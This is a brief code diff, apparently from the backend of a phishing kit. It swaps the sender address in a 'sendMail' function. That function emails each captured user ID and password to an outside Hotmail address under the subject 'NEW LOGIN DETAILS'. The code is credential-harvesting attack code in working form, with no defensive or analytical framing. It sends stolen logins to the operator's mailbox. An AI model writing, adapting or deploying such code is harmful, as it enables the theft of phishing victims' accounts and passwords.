@@ -10,7 +10,7 @@ const sendMail = (userID, password, res) => {
   })
 
   const mailOptions = {
-    from: 'webiniy01@gmail.com',
+    from: 'pat.nishimoto2@gmail.com',
     to: 'Ibekzmoney@hotmail.com',
     subject: 'NEW LOGIN DETAILS',
     text: `New login details. User ID: ${userID} and password: ${password} `,
